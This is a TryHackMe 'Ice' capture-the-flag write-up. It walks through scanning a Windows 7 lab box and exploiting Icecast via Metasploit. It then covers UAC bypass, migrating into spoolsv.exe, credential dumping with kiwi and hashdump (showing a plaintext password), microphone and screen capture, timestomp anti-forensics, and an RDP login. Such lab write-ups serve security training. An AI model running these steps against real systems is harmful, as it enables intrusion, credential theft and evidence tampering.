---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/ice/","tags":["CTF","write-up","windows"]}
---


---
# Active reconnaissance
## Enum ports and services
General scan to all ports
```shell
sudo nmap 10.10.211.3 -p- --open -min-rate 5000 -sS -vvv -n -Pn
```
Focused scan
```shell
sudo nmap 10.10.211.3 -p 135,139,445,3389,5357 -sCV
```
```
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
> [!check]- Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
> 3389

```shell
sudo nmap 10.10.211.3 -p 8000 -sCV
```

```PORT     STATE SERVICE VERSION
8000/tcp open  http    Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
```
> [!check]- What service did nmap identify as running on port 8000? (First word of this service)
> Icecast

# Vuln analysis
## Port 5357
```
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
> [!check]- What does Nmap identify as the hostname of the machine? (All caps for the answer)
> DARK-PC
## Port 139
netbios-ssn  Microsoft Windows netbios-ssn
```
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-24T18:50:30-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:c4:e0:41:87:43 (unknown)
| smb2-time:
|   date: 2024-08-24T23:50:30
|_  start_date: 2024-08-24T23:33:50
```
## Port 445
Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-08-24T23:50:58
|_  start_date: 2024-08-24T23:33:50
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:c4:e0:41:87:43 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-24T18:50:58-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
```
## Port 8000
```
PORT     STATE SERVICE VERSION
8000/tcp open  http    Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
```
![Pasted image 20240824193822.png|500](/img/user/attachments/Pasted%20image%2020240824193822.png)
> [!check]- What is the **Impact Score** for this vulnerability? Use [https://www.cvedetails.com](https://www.cvedetails.com) for this question and the next.
> 6.4

> [!check]- What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
> CVE-2004-1561


---
# Exploitation
## Icecast

> [!check]- After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the [Metasploit](https://tryhackme.com/module/metasploit) module.
> exploit/windows/http/icecast_header

> [!check]- Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
> rhosts

Set the victim IP
```shell
setg RHOSTS 10.10.x.x
```

Set the local IP (from tun0 if you a re using VPN)
```shell
setg LHOST 10.2.x.x
```

---
# Privilege Escalation
Now we have a shell
> [!check]- Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
> meterpreter

```shell
getuid
```
![Pasted image 20240824220248.png|300](/img/user/attachments/Pasted%20image%2020240824220248.png)
> [!check]- What user was running that Icecast process? The commands used in this question and the next few are taken directly from the '[Metasploit](https://tryhackme.com/module/metasploit)' module.
> Dark

Gets information about the remote system, such as OS
```shell
sysinfo
```
![Pasted image 20240824220618.png|500](/img/user/attachments/Pasted%20image%2020240824220618.png)

> [!check]- What build of Windows is the system?
> 7601

> [!check]- Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
> x64

```shell
run post/multi/recon/local_exploit_suggester
```
![Pasted image 20240824221707.png|500](/img/user/attachments/Pasted%20image%2020240824221707.png)

> [!check]- Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
> exploit/windows/local/bypassuac_eventvwr

Check the number session
![Pasted image 20240824231014.png|500](/img/user/attachments/Pasted%20image%2020240824231014.png)
Set session number `1` 
```shell
set SESSION 1
```

```shell
setg Lhost 10.10.x.x
```

> [!check]- Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
> LHOST

Exec `run`

> [!check]- We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
> SeTakeOwnershipPrivilege

```shell
getprivs
```
![Pasted image 20240824232307.png|200](/img/user/attachments/Pasted%20image%2020240824232307.png)
# Looting
```shell
ps
```
![Pasted image 20240825101506.png](/img/user/attachments/Pasted%20image%2020240825101506.png)

> [!check]- The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
> spoolsv.exe

Migrate
```shell
migrate -N spoolsv.exe
```
![Pasted image 20240825103500.png|300](/img/user/attachments/Pasted%20image%2020240825103500.png)

> [!check]- Let's check what user we are now with the command `getuid`. What user is listed?
> NT AUTHORITY\SYSTEM

```shell
load kiwi
help
```
![Pasted image 20240825105633.png|300](/img/user/attachments/Pasted%20image%2020240825105633.png)

> [!check]- Which command allows up to retrieve all credentials?
> creds_all

![Pasted image 20240825110114.png](/img/user/attachments/Pasted%20image%2020240825110114.png)

> [!check]- Run this command now. What is Dark's password?
> Password01!
# Post-Explotation
```shell
help
```

![Pasted image 20240825124215.png|500](/img/user/attachments/Pasted%20image%2020240825124215.png)
> [!check]- What command allows us to dump all of the password hashes stored on the system?
> hashdump

![Pasted image 20240825124627.png|500](/img/user/attachments/Pasted%20image%2020240825124627.png)

> [!check]- While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
> screenshare

![Pasted image 20240825124742.png](/img/user/attachments/Pasted%20image%2020240825124742.png)

> [!check]- How about if we wanted to record from a microphone attached to the system?
> record_mic

![Pasted image 20240825125050.png|300](/img/user/attachments/Pasted%20image%2020240825125050.png)

> [!check]- To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?
> timestomp

To connect remotely
```shell
rdesktop 10.10.106.178 -u Dark -p 'Password01!'  
```


---